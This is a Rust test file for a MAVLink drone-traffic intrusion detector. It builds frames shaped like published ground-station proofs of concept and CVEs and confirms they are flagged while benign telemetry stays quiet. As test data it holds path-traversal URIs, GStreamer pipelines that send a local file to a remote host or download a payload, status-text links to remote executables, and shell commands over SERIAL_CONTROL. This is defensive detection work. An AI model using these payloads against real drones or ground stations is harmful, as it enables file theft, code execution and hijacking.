//! Frames shaped like each proof of concept (infected-drones READMEs and
//! PoCs, OWASP-cited CVEs), and benign ArduPilot / PX4 traffic that must
//! stay quiet.

use std::vec::Vec;

use crate::frame::encode::{Sign, v1, v2};
use crate::msg::{self, ftp};
use crate::*;

const LINK: Link = Link {
    key: 7,
    distinct: true,
};

fn enc(seq: u8, sys: u8, comp: u8, msgid: u32, payload: &[u8], sign: Option<Sign>) -> Vec<u8> {
    let mut b = [0u8; 300];
    let n = v2(&mut b, seq, sys, comp, msgid, payload, sign);
    b[..n].to_vec()
}

/// Run frames (each with its time, ms) through one analyser.
fn run(an: &mut Analyser, link: Link, frames: &[(Vec<u8>, u64)]) -> Vec<Finding> {
    let mut got = Vec::new();
    for (bytes, t) in frames {
        for f in crate::frames(bytes) {
            an.frame(link, &f, *t, &mut |x, _| got.push(x.clone()));
        }
    }
    got
}

fn kinds(fs: &[Finding]) -> Vec<Kind> {
    let mut k: Vec<Kind> = fs.iter().map(|f| f.kind).collect();
    k.dedup();
    k
}

fn put(p: &mut [u8], off: usize, s: &[u8]) {
    p[off..off + s.len()].copy_from_slice(s);
}

// ---------------------------------------------------------- payloads --

fn heartbeat() -> [u8; 9] {
    let mut p = [0u8; 9];
    p[..4].copy_from_slice(&4u32.to_le_bytes());
    p[4..].copy_from_slice(&[2, 3, 0x81, 4, 3]);
    p
}

fn camera_info(vendor: &[u8], model: &[u8], uri: &[u8]) -> [u8; 237] {
    use msg::camera_information as c;
    let mut p = [0u8; 237];
    put(&mut p, c::VENDOR, vendor);
    put(&mut p, c::MODEL, model);
    put(&mut p, c::URI, uri);
    p[28] = 1; // cam_definition_version
    p
}

fn video_info(uri: &[u8]) -> [u8; 217] {
    let mut p = [0u8; 217];
    put(&mut p, 21, b"poc");
    put(&mut p, msg::video_stream_information::URI, uri);
    p
}

fn component_metadata(uri: &[u8]) -> [u8; 108] {
    let mut p = [0u8; 108];
    put(&mut p, msg::component_metadata::URI, uri);
    p
}

fn component_information(general: &[u8], peripherals: &[u8]) -> [u8; 212] {
    use msg::component_information as c;
    let mut p = [0u8; 212];
    put(&mut p, c::GENERAL_URI, general);
    put(&mut p, c::PERIPHERALS_URI, peripherals);
    p
}

fn statustext(sev: u8, text: &[u8]) -> [u8; 54] {
    let mut p = [0u8; 54];
    p[0] = sev;
    put(&mut p, 1, text);
    p
}

fn param_value(id: &[u8], v: f32, ty: u8, count: u16, index: u16) -> [u8; 25] {
    use msg::param_value as pv;
    let mut p = [0u8; 25];
    put(&mut p, pv::VALUE, &v.to_le_bytes());
    put(&mut p, pv::COUNT, &count.to_le_bytes());
    put(&mut p, pv::INDEX, &index.to_le_bytes());
    put(&mut p, pv::ID, id);
    p[pv::TYPE] = ty;
    p
}

fn param_set(id: &[u8], v: f32, ty: u8) -> [u8; 23] {
    use msg::param_set as ps;
    let mut p = [0u8; 23];
    put(&mut p, ps::VALUE, &v.to_le_bytes());
    p[ps::TARGET_SYSTEM] = 1;
    p[ps::TARGET_COMPONENT] = 1;
    put(&mut p, ps::ID, id);
    p[ps::TYPE] = ty;
    p
}

fn serial_control(dev: u8, count: u8, data: &[u8]) -> [u8; 81] {
    use msg::serial_control as sc;
    let mut p = [0u8; 81];
    p[sc::DEVICE] = dev;
    p[sc::FLAGS] = 0x06; // RESPOND | EXCLUSIVE
    p[sc::COUNT] = count;
    put(&mut p, sc::DATA, data);
    p[sc::TARGET_SYSTEM] = 1;
    p[sc::TARGET_COMPONENT] = 1;
    p
}

fn ftp_msg(opcode: u8, req: u8, size: u8, offset: u32, data: &[u8]) -> [u8; 254] {
    let mut p = [0u8; 254];
    p[1] = 255; // to the ground station
    p[2] = 190;
    p[ftp::OPCODE] = opcode;
    p[ftp::SIZE] = size;
    p[ftp::REQ_OPCODE] = req;
    put(&mut p, ftp::OFFSET, &offset.to_le_bytes());
    put(&mut p, ftp::DATA, data);
    p
}

fn command_long(cmd: u16) -> [u8; 33] {
    let mut p = [0u8; 33];
    put(&mut p, 28, &cmd.to_le_bytes());
    p[30] = 1;
    p[31] = 1;
    p
}

fn sign(link_id: u8, ts: u64) -> Option<Sign> {
    Some(Sign {
        link_id,
        timestamp: ts,
        sig: [0xA5, 1, 2, 3, 4, 5],
    })
}

/// Ordinary telemetry: an ArduPilot vehicle (1/1) at ~10 frames/s with a
/// lossy link (every 5th frame lost, and frames of messages we cannot
/// check), a GCS (255/190) heartbeating, a SiK radio's RADIO_STATUS.
fn benign_telemetry(t0: u64, secs: u64, signed: bool) -> Vec<(Vec<u8>, u64)> {
    let mut v = Vec::new();
    let mut seq: u8 = 17;
    let mut gseq: u8 = 200;
    let mut ts = 1_000_000_000u64;
    for i in 0..secs * 10 {
        let t = t0 + i * 100;
        seq = seq.wrapping_add(3); // two unseen messages between
        ts += 1;
        let s = if signed { sign(0, ts) } else { None };
        if i % 5 != 4 {
            let msgid = [
                msg::HEARTBEAT,
                msg::GLOBAL_POSITION_INT,
                msg::SYS_STATUS,
                msg::GPS_RAW_INT,
            ][i as usize % 4];
            let p = [1u8; 64];
            let len = crate::frame::info(msgid).unwrap().base_len as usize;
            v.push((enc(seq, 1, 1, msgid, &p[..len], s), t));
        }
        if i % 10 == 0 {
            gseq = gseq.wrapping_add(1);
            ts += 1;
            let s = if signed { sign(1, ts) } else { None };
            v.push((enc(gseq, 255, 190, msg::HEARTBEAT, &heartbeat(), s), t + 5));
            v.push((
                enc(
                    i as u8,
                    51,
                    68,
                    msg::RADIO_STATUS,
                    &[1, 2, 3, 4, 5, 6, 7, 8, 9],
                    None,
                ),
                t + 7,
            ));
        }
    }
    v
}

// ------------------------------------------------------------ benign --

#[test]
fn benign_traffic_is_quiet() {
    let mut an = Analyser::new();
    let mut frames = benign_telemetry(0, 60, false);
    let t = 61_000;
    // Legitimate camera and metadata URIs (PX4 / Siyi / ArduPilot shapes).
    frames.push((
        enc(
            1,
            1,
            100,
            msg::CAMERA_INFORMATION,
            &camera_info(b"Siyi", b"A8 mini", b"http://192.168.144.25/cam_def.xml"),
            None,
        ),
        t,
    ));
    frames.push((
        enc(
            2,
            1,
            100,
            msg::CAMERA_INFORMATION,
            &camera_info(b"PX4", b"Gazebo", b"mftp://[;comp=100]camera.xml"),
            None,
        ),
        t,
    ));
    frames.push((
        enc(
            3,
            1,
            1,
            msg::COMPONENT_METADATA,
            &component_metadata(b"mftp://[;comp=1]/etc/extras/component_general.json.xz"),
            None,
        ),
        t,
    ));
    frames.push((
        enc(
            4,
            1,
            1,
            msg::COMPONENT_INFORMATION,
            &component_information(
                b"mftp://[;comp=1]/etc/extras/component_general.json.xz",
                b"",
            ),
            None,
        ),
        t,
    ));
    frames.push((
        enc(
            5,
            1,
            100,
            msg::VIDEO_STREAM_INFORMATION,
            &video_info(b"rtsp://192.168.144.25:8554/main.264"),
            None,
        ),
        t,
    ));
    frames.push((
        enc(
            6,
            1,
            100,
            msg::VIDEO_STREAM_INFORMATION,
            &video_info(b"udp://0.0.0.0:5600"),
            None,
        ),
        t,
    ));
    // Status text, including one garbled message (a single oddity).
    frames.push((
        enc(
            7,
            1,
            1,
            msg::STATUSTEXT,
            &statustext(3, b"PreArm: Need 3D Fix"),
            None,
        ),
        t,
    ));
    frames.push((
        enc(
            8,
            1,
            1,
            msg::STATUSTEXT,
            &statustext(6, b"ArduCopter V4.5.7 (2a3dc4b7)"),
            None,
        ),
        t,
    ));
    frames.push((
        enc(
            9,
            1,
            1,
            msg::STATUSTEXT,
            &statustext(6, b"Frame: QUAD/X\x01"),
            None,
        ),
        t,
    ));
    // A full parameter download, twice (reconnect), with sane totals.
    for round in 0..2u64 {
        for i in 0..1_800u16 {
            let mut id = *b"PARAM_0000\0\0\0\0\0\0";
            id[6..10].copy_from_slice(std::format!("{i:04}").as_bytes());
            frames.push((
                enc(
                    i as u8,
                    1,
                    1,
                    msg::PARAM_VALUE,
                    &param_value(&id, 1.0, 9, 1800, i),
                    None,
                ),
                t + 100 + round * 60_000 + i as u64 * 10,
            ));
        }
    }
    let t = t + 200_000;
    frames.push((
        enc(
            10,
            1,
            1,
            msg::PARAM_VALUE,
            &param_value(b"RALLY_TOTAL", 3.0, 2, 1800, 5),
            None,
        ),
        t,
    ));
    frames.push((
        enc(
            11,
            1,
            1,
            msg::PARAM_VALUE,
            &param_value(b"FENCE_TOTAL", 0.0, 2, 1800, 6),
            None,
        ),
        t,
    ));
    frames.push((
        enc(
            12,
            255,
            190,
            msg::PARAM_SET,
            &param_set(b"WPNAV_SPEED", 500.0, 9),
            None,
        ),
        t,
    ));
    // MAVLink FTP: a log listing and normal reads.
    let listing = b"D.\0D..\0F00000001.BIN\t1048576\0F00000002.BIN\t52428800\0FLASTLOG.TXT\t3\0";
    frames.push((
        enc(
            13,
            1,
            1,
            msg::FILE_TRANSFER_PROTOCOL,
            &ftp_msg(
                ftp::ACK,
                ftp::LIST_DIRECTORY,
                listing.len() as u8,
                0,
                listing,
            ),
            None,
        ),
        t,
    ));
    frames.push((
        enc(
            14,
            1,
            1,
            msg::FILE_TRANSFER_PROTOCOL,
            &ftp_msg(ftp::ACK, ftp::BURST_READ_FILE, 239, 52_428_561, &[7; 239]),
            None,
        ),
        t,
    ));
    frames.push((
        enc(
            15,
            255,
            190,
            msg::FILE_TRANSFER_PROTOCOL,
            &ftp_msg(ftp::OPEN_FILE_RO, 0, 22, 0, b"/APM/LOGS/00000002.BIN"),
            None,
        ),
        t,
    ));
    frames.push((
        enc(
            16,
            1,
            1,
            msg::FILE_TRANSFER_PROTOCOL,
            &ftp_msg(
                ftp::ACK,
                ftp::OPEN_FILE_RO,
                4,
                0,
                &52_428_800u32.to_le_bytes(),
            ),
            None,
        ),
        t,
    ));
    frames.push((
        enc(
            17,
            1,
            1,
            msg::FILE_TRANSFER_PROTOCOL,
            &ftp_msg(ftp::ACK, ftp::WRITE_FILE, 4, 0, &239u32.to_le_bytes()),
            None,
        ),
        t,
    ));
    // MAVLink 1 heartbeats from an old GCS.
    let mut b = [0u8; 40];
    let n = v1(&mut b, 0, 254, 190, msg::HEARTBEAT, &heartbeat());
    frames.push((b[..n].to_vec(), t));
    let got = run(&mut an, LINK, &frames);
    assert!(got.is_empty(), "{got:?}");
}

#[test]
fn benign_signed_link_with_resends_and_reboot_is_quiet() {
    let mut an = Analyser::new();
    let mut frames = benign_telemetry(0, 30, true);
    // SiK resends: every 7th frame heard twice, 40 ms apart.
    let dups: Vec<_> = frames
        .iter()
        .step_by(7)
        .map(|(b, t)| (b.clone(), t + 40))
        .collect();
    frames.extend(dups);
    frames.sort_by_key(|x| x.1);
    // The vehicle reboots: sequence restarts at 0, signing goes on.
    let mut after = benign_telemetry(40_000, 20, true);
    for (b, _) in after.iter_mut() {
        // New timestamps after the reboot are later still.
        if b[2] & 1 != 0 {
            let at = b.len() - 12;
            let ts = u64::from_le_bytes([
                b[at],
                b[at + 1],
                b[at + 2],
                b[at + 3],
                b[at + 4],
                b[at + 5],
                0,
                0,
            ]) + 1_000_000;
            b[at..at + 6].copy_from_slice(&ts.to_le_bytes()[..6]);
        }
    }
    frames.extend(after);
    // The GCS (signed) sends signed commands, as it should.
    frames.push((
        enc(
            1,
            255,
            190,
            msg::COMMAND_LONG,
            &command_long(400),
            sign(1, 9_000_000_000),
        ),
        61_000,
    ));
    frames.push((
        enc(
            2,
            255,
            190,
            msg::COMMAND_LONG,
            &command_long(176),
            sign(1, 9_000_000_001),
        ),
        61_100,
    ));
    let got = run(&mut an, LINK, &frames);
    assert!(got.is_empty(), "{got:?}");
}

#[test]
fn integrity_kinds_need_a_distinct_link() {
    // Two honest vehicles, both sysid 1, on two links the node cannot tell
    // apart (IDs off): interleaved sequences, no finding.
    let mut an = Analyser::new();
    let shared = Link {
        key: 9,
        distinct: false,
    };
    let mut frames = Vec::new();
    for i in 0..100u64 {
        frames.push((
            enc(i as u8, 1, 1, msg::HEARTBEAT, &heartbeat(), None),
            i * 100,
        ));
        frames.push((
            enc(
                (i as u8).wrapping_add(90),
                1,
                1,
                msg::HEARTBEAT,
                &{
                    let mut h = heartbeat();
                    h[0] = 9;
                    h
                },
                None,
            ),
            i * 100 + 50,
        ));
    }
    assert!(run(&mut an, shared, &frames).is_empty());
    // The same with a distinct link is an injector.
    let mut an = Analyser::new();
    assert_eq!(kinds(&run(&mut an, LINK, &frames)), [Kind::SeqInterleave]);
}

// -------------------------------------------- infected-drones findings --

fn one(msgid: u32, sys: u8, comp: u8, payload: &[u8]) -> Vec<Finding> {
    let mut an = Analyser::new();
    run(
        &mut an,
        LINK,
        &[(enc(0, sys, comp, msgid, payload, None), 1_000)],
    )
}

#[test]
fn qgc01_camera_name_and_uri_traversal() {
    let got = one(
        msg::CAMERA_INFORMATION,
        1,
        100,
        &camera_info(
            b"../../../../../tmp",
            b"QGC01",
            b"http://192.168.2.64:8000/c.xml",
        ),
    );
    assert_eq!(kinds(&got), [Kind::CameraName]);
    assert_eq!(got[0].excerpt.as_str(), "../../../../../tmp");
    let got = one(
        msg::CAMERA_INFORMATION,
        1,
        100,
        &camera_info(b"PX4", b"cam", b"mftp://../../root/Documents/m.plan"),
    );
    assert_eq!(kinds(&got), [Kind::UriTraversal]);
}

#[test]
fn mavsdk02_mftp_traversal_and_encoded() {
    for uri in [
        &b"mftp://../../../../tmp/x"[..],
        b"mavlinkftp://..%2f..%2f..%2ftmp%2fx.xz",
        b"http://h/%252e%252e/%252e%252e/etc",
    ] {
        let got = one(
            msg::CAMERA_INFORMATION,
            1,
            100,
            &camera_info(b"v", b"m", uri),
        );
        assert_eq!(
            kinds(&got),
            [Kind::UriTraversal],
            "{}",
            std::str::from_utf8(uri).unwrap()
        );
    }
}

#[test]
fn qgc02_mavsdk01_component_metadata_local_and_traversal() {
    let got = one(
        msg::COMPONENT_METADATA,
        1,
        1,
        &component_metadata(b"file:///home/op/.config/QGroundControl.org/x"),
    );
    assert_eq!(kinds(&got), [Kind::UriScheme]);
    let got = one(
        msg::COMPONENT_METADATA,
        1,
        1,
        &component_metadata(b"mftp://[;comp=1]../../../AppData/Roaming/Microsoft/x.bat"),
    );
    assert_eq!(kinds(&got), [Kind::UriTraversal]);
    // The deprecated COMPONENT_INFORMATION fallback, peripherals field.
    let got = one(
        msg::COMPONENT_INFORMATION,
        1,
        1,
        &component_information(b"", b"\\\\10.0.0.9\\share\\p.json"),
    );
    assert_eq!(kinds(&got), [Kind::UriScheme]);
}

#[test]
fn mp02_gst_pipeline() {
    for uri in [
        &b"gst://filesrc location=C:\\Users\\nick\\Desktop\\target.txt ! tcpclientsink host=192.168.2.64 port=9999"[..],
        b"gst://souphttpsrc location=http://192.168.2.64:8080/payload.txt ! filesink location=C:\\x.txt",
        b"rtsp://10.0.0.1:8554/x latency=0 ! filesink location=/tmp/y",
    ] {
        let got = one(msg::VIDEO_STREAM_INFORMATION, 1, 100, &video_info(uri));
        assert_eq!(kinds(&got), [Kind::VideoPipeline]);
    }
}

#[test]
fn mp03_statustext_link_markup_whole_and_split() {
    let got = one(
        msg::STATUSTEXT,
        1,
        1,
        &statustext(2, b"Arm: [link;\\\\10.0.0.9\\s\\x.exe;ArduPilot docs]"),
    );
    assert_eq!(kinds(&got), [Kind::StatusLink]);
    // Split over two messages (Mission Planner concatenates them).
    let mut an = Analyser::new();
    let got = run(
        &mut an,
        LINK,
        &[
            (
                enc(
                    0,
                    1,
                    1,
                    msg::STATUSTEXT,
                    &statustext(2, b"PreArm: Check FS_THR_VALUE, see [li"),
                    None,
                ),
                1_000,
            ),
            (
                enc(
                    1,
                    1,
                    1,
                    msg::STATUSTEXT,
                    &statustext(2, b"nk;file:///C:/Windows/System32/calc.exe;docs]"),
                    None,
                ),
                1_050,
            ),
        ],
    );
    assert_eq!(kinds(&got), [Kind::StatusLink]);
}

#[test]
fn statustext_control_characters_need_two() {
    let mut an = Analyser::new();
    let esc = statustext(4, b"\x1b]0;owned\x07\x1b[2J");
    let got = run(
        &mut an,
        LINK,
        &[(enc(0, 1, 1, msg::STATUSTEXT, &esc, None), 1_000)],
    );
    assert!(got.is_empty());
    let got = run(
        &mut an,
        LINK,
        &[(enc(1, 1, 1, msg::STATUSTEXT, &esc, None), 20_000)],
    );
    assert_eq!(kinds(&got), [Kind::StatusControl]);
    // Two a long time apart do not add up.
    let mut an = Analyser::new();
    let got = run(
        &mut an,
        LINK,
        &[
            (enc(0, 1, 1, msg::STATUSTEXT, &esc, None), 1_000),
            (enc(1, 1, 1, msg::STATUSTEXT, &esc, None), 200_000),
        ],
    );
    assert!(got.is_empty());
}

#[test]
fn qgc03_mp01_ftp_listing_traversal_and_offset() {
    let listing = b"F../../../../tmp/QGC03_PWNED\t12\0";
    let got = one(
        msg::FILE_TRANSFER_PROTOCOL,
        1,
        1,
        &ftp_msg(
            ftp::ACK,
            ftp::LIST_DIRECTORY,
            listing.len() as u8,
            0,
            listing,
        ),
    );
    assert_eq!(kinds(&got), [Kind::FtpTraversal]);
    let listing = b"Flog.bin        ..\\..\\..\\Program Files (x86)\\Mission Planner\\plugins\\evil.cs\t900\0";
    let got = one(
        msg::FILE_TRANSFER_PROTOCOL,
        1,
        1,
        &ftp_msg(
            ftp::ACK,
            ftp::LIST_DIRECTORY,
            listing.len() as u8,
            0,
            listing,
        ),
    );
    assert_eq!(kinds(&got), [Kind::FtpTraversal]);
    let got = one(
        msg::FILE_TRANSFER_PROTOCOL,
        1,
        1,
        &ftp_msg(
            ftp::ACK,
            ftp::BURST_READ_FILE,
            239,
            0xFFFF_FFF0,
            &[0x41; 239],
        ),
    );
    assert_eq!(kinds(&got), [Kind::FtpOffset]);
}

#[test]
fn mavros02_ftp_malformed_acks_and_owasp_long_path() {
    let got = one(
        msg::FILE_TRANSFER_PROTOCOL,
        1,
        1,
        &ftp_msg(
            ftp::ACK,
            ftp::WRITE_FILE,
            4,
            0,
            &0x0010_0000u32.to_le_bytes(),
        ),
    );
    assert_eq!(kinds(&got), [Kind::FtpMalformed]);
    let got = one(
        msg::FILE_TRANSFER_PROTOCOL,
        1,
        1,
        &ftp_msg(ftp::ACK, ftp::OPEN_FILE_RO, 7, 0, &[1, 2, 3, 4, 5, 6, 7]),
    );
    assert_eq!(kinds(&got), [Kind::FtpMalformed]);
    let got = one(
        msg::FILE_TRANSFER_PROTOCOL,
        1,
        1,
        &ftp_msg(ftp::ACK, ftp::READ_FILE, 250, 0, &[1; 239]),
    );
    assert_eq!(kinds(&got), [Kind::FtpMalformed]);
    let mut path = [b'A'; 239];
    path[0] = b'/';
    let got = one(
        msg::FILE_TRANSFER_PROTOCOL,
        255,
        190,
        &ftp_msg(ftp::OPEN_FILE_WO, 0, 239, 0, &path),
    );
    assert_eq!(kinds(&got), [Kind::FtpMalformed]);
    assert_eq!(got[0].target, Some((255, 190)));
}

#[test]
fn mp04_rally_and_fence_totals() {
    for (id, v) in [
        (&b"RALLY_TOTAL"[..], 3.5f32),
        (b"RALLY_TOTAL", f32::NAN),
        (b"FENCE_TOTAL", 1e30),
        (b"FENCE_TOTAL", 100_000.0),
        (b"RALLY_TOTAL", -1.0),
    ] {
        let got = one(msg::PARAM_VALUE, 1, 1, &param_value(id, v, 9, 900, 12));
        assert_eq!(kinds(&got), [Kind::ParamTotal], "{v}");
    }
}

#[test]
fn mavros01_param_id_flood() {
    let mut an = Analyser::new();
    let mut frames = Vec::new();
    for i in 0..4_000u32 {
        let id = std::format!("X{i:08x}");
        frames.push((
            enc(
                i as u8,
                1,
                1,
                msg::PARAM_VALUE,
                &param_value(id.as_bytes(), 0.0, 9, 1, 0),
                None,
            ),
            1_000 + i as u64 * 5,
        ));
    }
    let got = run(&mut an, LINK, &frames);
    assert_eq!(kinds(&got), [Kind::ParamFlood]);
    // Rate limit: one report per 2 s at most over the ~13 s of flood.
    assert!(got.len() <= 7, "{}", got.len());
}

// ------------------------------------------------------- OWASP CVEs --

#[test]
fn owasp_param_set_non_finite() {
    for v in [f32::NAN, f32::INFINITY, f32::NEG_INFINITY] {
        let got = one(
            msg::PARAM_SET,
            255,
            190,
            &param_set(b"ATC_RAT_RLL_P", v, msg::PARAM_TYPE_REAL32),
        );
        assert_eq!(kinds(&got), [Kind::ParamSetNonFinite]);
        assert_eq!(got[0].target, Some((1, 1)));
    }
    // An integer parameter's bytes are not a float: not checked.
    assert!(
        one(
            msg::PARAM_SET,
            255,
            190,
            &param_set(b"SYSID_THISMAV", f32::NAN, 6)
        )
        .is_empty()
    );
}

#[test]
fn cve_2026_1579_px4_shell_over_serial_control() {
    let got = one(
        msg::SERIAL_CONTROL,
        255,
        190,
        &serial_control(msg::serial_control::DEV_SHELL, 8, b"reboot\n\0"),
    );
    assert_eq!(kinds(&got), [Kind::SerialControl]);
    assert!(
        got[0].excerpt.starts_with("dev 10 n 8: reboot"),
        "{}",
        got[0].excerpt
    );
}

#[test]
fn cve_2026_38971_serial_control_oob_count() {
    let got = one(
        msg::SERIAL_CONTROL,
        255,
        190,
        &serial_control(0, 250, &[0x41; 70]),
    );
    assert_eq!(kinds(&got), [Kind::SerialControlMalformed]);
}

#[test]
fn setup_signing_over_the_air_never_shows_the_key() {
    let mut p = [0u8; 42];
    p[8] = 1;
    p[9] = 1;
    put(&mut p, 10, b"KEYKEYKEYKEYKEYKEYKEYKEYKEYKEYKE");
    let got = one(msg::SETUP_SIGNING, 255, 190, &p);
    assert_eq!(kinds(&got), [Kind::SetupSigning]);
    assert!(!got[0].excerpt.contains("KEY"));
}

// ------------------------------------------ lengths parsers accept --

/// A frame of a known message with any payload length (the checksum, with
/// the message's CRC_EXTRA, right), as a lenient parser accepts it.
fn enc_len(version: u8, msgid: u32, payload: &[u8]) -> Vec<u8> {
    let mut b = [0u8; 300];
    let n = if version == 1 {
        v1(&mut b, 0, 255, 190, msgid, payload)
    } else {
        crate::frame::encode::v2_raw(&mut b, 0, 255, 190, msgid, payload, None, false)
    };
    b[..n].to_vec()
}

fn found(bytes: &[u8]) -> Vec<Kind> {
    let mut an = Analyser::new();
    let mut k: Vec<Kind> = run(&mut an, LINK, &[(bytes.to_vec(), 1_000)]).iter().map(|f| f.kind).collect();
    k.sort();
    k
}

#[test]
fn over_long_frames_are_analysed_truncated() {
    // SERIAL_CONTROL is 81 bytes at most; this one carries 120 (the C
    // library without strict length checks and pymavlink take the first
    // 81). Until WP-11a: "Bad", never analysed.
    let mut p = serial_control(msg::serial_control::DEV_SHELL, 8, b"reboot\n\0").to_vec();
    p.extend_from_slice(&[0x5A; 39]);
    assert_eq!(found(&enc_len(2, msg::SERIAL_CONTROL, &p)), [Kind::SerialControl, Kind::OddLength]);
    // MAVLink 1 has one length per message: anything longer is odd too.
    let mut st = statustext(6, b"[link;file:///c:/x.exe;Click]").to_vec();
    st.truncate(51);
    st.extend_from_slice(&[1; 9]);
    assert_eq!(found(&enc_len(1, msg::STATUSTEXT, &st)), [Kind::StatusLink, Kind::OddLength]);
    // FTP's 254-byte payload sent as 255.
    let mut f = ftp_msg(ftp::ACK, ftp::LIST_DIRECTORY, 12, 0, b"F../../x\t1\0").to_vec();
    f.push(0x77);
    assert_eq!(found(&enc_len(2, msg::FILE_TRANSFER_PROTOCOL, &f)), [Kind::FtpTraversal, Kind::OddLength]);
}

#[test]
fn short_frames_are_analysed_zero_padded() {
    // SERIAL_CONTROL in MAVLink 1 with 30 of its 79 bytes: parsers pad it
    // with zeros and act on it.
    let short = &serial_control(msg::serial_control::DEV_SHELL, 5, b"ls /\n")[..30];
    assert_eq!(found(&enc_len(1, msg::SERIAL_CONTROL, short)), [Kind::SerialControl, Kind::OddLength]);
    // An empty MAVLink 2 payload (senders keep at least one byte).
    assert_eq!(found(&enc_len(2, msg::SETUP_SIGNING, &[])), [Kind::SetupSigning, Kind::OddLength]);
}

#[test]
fn strict_frames_behave_as_before_and_bad_checksums_stay_bad() {
    // Exactly the base length (v1), trimmed (v2), full with extensions (v2):
    // no length finding.
    let p = serial_control(msg::serial_control::DEV_SHELL, 8, b"reboot\n\0");
    assert_eq!(found(&enc_len(1, msg::SERIAL_CONTROL, &p[..79])), [Kind::SerialControl]);
    assert_eq!(found(&enc(0, 255, 190, msg::SERIAL_CONTROL, &p, None)), [Kind::SerialControl]);
    assert_eq!(found(&enc_len(2, msg::SERIAL_CONTROL, &p)), [Kind::SerialControl]);
    assert!(found(&enc(0, 1, 1, msg::HEARTBEAT, &heartbeat(), None)).is_empty());
    // Odd length and a wrong checksum: not a frame.
    let mut long = serial_control(0, 8, b"x").to_vec();
    long.extend_from_slice(&[1; 30]);
    let mut b = enc_len(2, msg::SERIAL_CONTROL, &long);
    let n = b.len();
    b[n - 1] ^= 0x40;
    assert!(found(&b).is_empty());
    assert_eq!(crate::parse_at(&b), crate::Parse::Bad);
    let mut b = enc_len(1, msg::STATUSTEXT, &[b'x'; 70]);
    b[10] ^= 1;
    assert_eq!(crate::parse_at(&b), crate::Parse::Bad);
}

// --------------------------------------------------- link integrity --

#[test]
fn cve_2020_10283_signing_downgrade() {
    let mut an = Analyser::new();
    let mut frames = benign_telemetry(0, 10, true);
    // An injector sends unsigned commands as the GCS while it signs.
    frames.push((
        enc(77, 255, 190, msg::COMMAND_LONG, &command_long(400), None),
        5_050,
    ));
    frames.push((
        enc(78, 255, 190, msg::COMMAND_LONG, &command_long(400), None),
        5_350,
    ));
    frames.sort_by_key(|x| x.1);
    let got = run(&mut an, LINK, &frames);
    assert_eq!(kinds(&got), [Kind::SigningDowngrade]);
    assert_eq!(got[0].target, Some((1, 1)));
    // One unsigned command alone is not enough; and an operator who turned
    // signing off (no signed frames for a while) is not a downgrade.
    let mut an = Analyser::new();
    let mut frames = benign_telemetry(0, 10, true);
    frames.push((
        enc(77, 255, 190, msg::COMMAND_LONG, &command_long(400), None),
        5_050,
    ));
    frames.push((
        enc(78, 255, 190, msg::COMMAND_LONG, &command_long(400), None),
        60_000,
    ));
    frames.push((
        enc(79, 255, 190, msg::COMMAND_LONG, &command_long(400), None),
        60_500,
    ));
    frames.sort_by_key(|x| x.1);
    assert!(run(&mut an, LINK, &frames).is_empty());
}

#[test]
fn injector_interleaves_sequence_numbers() {
    let mut an = Analyser::new();
    let mut frames = benign_telemetry(0, 10, false);
    // A second transmitter claiming 1/1 with its own counter, 4 frames/s.
    for i in 0..40u64 {
        frames.push((
            enc(
                (i as u8).wrapping_add(150),
                1,
                1,
                msg::GLOBAL_POSITION_INT,
                &[9u8; 28],
                None,
            ),
            1_000 + i * 250 + 30,
        ));
    }
    frames.sort_by_key(|x| x.1);
    let got = run(&mut an, LINK, &frames);
    assert_eq!(kinds(&got), [Kind::SeqInterleave]);
}

#[test]
fn replayed_signed_frames() {
    let mut an = Analyser::new();
    let mut frames = benign_telemetry(0, 20, true);
    // Signed vehicle frames captured early and played back 10 s later.
    let captured: Vec<_> = frames
        .iter()
        .filter(|(b, _)| b[5] == 1)
        .take(3)
        .map(|(b, t)| (b.clone(), t + 10_000))
        .collect();
    frames.extend(captured);
    frames.sort_by_key(|x| x.1);
    let got = run(&mut an, LINK, &frames);
    assert_eq!(kinds(&got), [Kind::SignedReplay]);
}

// ----------------------------------------------------- reassembly --

#[test]
fn frames_split_across_radio_packets() {
    // One CAMERA_INFORMATION with a file:// URI, cut into 3 "SiK packets",
    // with telemetry and junk around it.
    let mut bytes = Vec::new();
    bytes.extend(enc(1, 1, 1, msg::HEARTBEAT, &heartbeat(), None));
    bytes.extend([0xFD, 0x10, 0x00]); // junk incl. a start byte
    bytes.extend(enc(
        2,
        1,
        100,
        msg::CAMERA_INFORMATION,
        &camera_info(b"v", b"m", b"file:///etc/passwd"),
        None,
    ));
    bytes.extend(enc(3, 1, 1, msg::HEARTBEAT, &heartbeat(), None));
    let mut w = Watch::new();
    let key = StreamKey {
        system: 2,
        id: Some(25),
        dir: 0,
    };
    let mut got = Vec::new();
    let mut frames = 0;
    for (i, chunk) in bytes.chunks(50).enumerate() {
        w.feed(key, chunk, i as u64 * 20, &mut |f, fr| {
            got.push(f.kind);
            assert_eq!(fr.msgid, msg::CAMERA_INFORMATION);
        });
        frames += 1;
    }
    assert!(frames >= 3);
    assert_eq!(got, [Kind::UriScheme]);
}

#[test]
fn kind_codes_are_stable() {
    for (i, k) in Kind::ALL.iter().enumerate() {
        assert_eq!(k.code(), i as u32 + 1);
        assert_eq!(Kind::from_code(k.code()), Some(*k));
        assert!(!k.label().is_empty());
    }
    assert_eq!(Kind::from_code(0), None);
    assert_eq!(Kind::from_code(20), None);
    assert!(
        core::mem::size_of::<Watch>() < 9 * 1024,
        "{}",
        core::mem::size_of::<Watch>()
    );
}

#[test]
fn random_bytes_find_nothing() {
    let mut x: u32 = 0x1234_5678;
    let mut w = Watch::new();
    let key = StreamKey {
        system: 2,
        id: None,
        dir: 0,
    };
    let mut n = 0;
    for p in 0..2_000u64 {
        let mut pkt = [0u8; 200];
        for b in pkt.iter_mut() {
            x ^= x << 13;
            x ^= x >> 17;
            x ^= x << 5;
            *b = x as u8;
        }
        w.feed(key, &pkt, p * 10, &mut |_, _| n += 1);
    }
    assert_eq!(n, 0);
}

#[test]
fn state_size() {
    std::println!(
        "SIZE mavwatch Watch {} B, Analyser {} B, Stream {} B",
        core::mem::size_of::<Watch>(),
        core::mem::size_of::<Analyser>(),
        core::mem::size_of::<Stream>()
    );
}
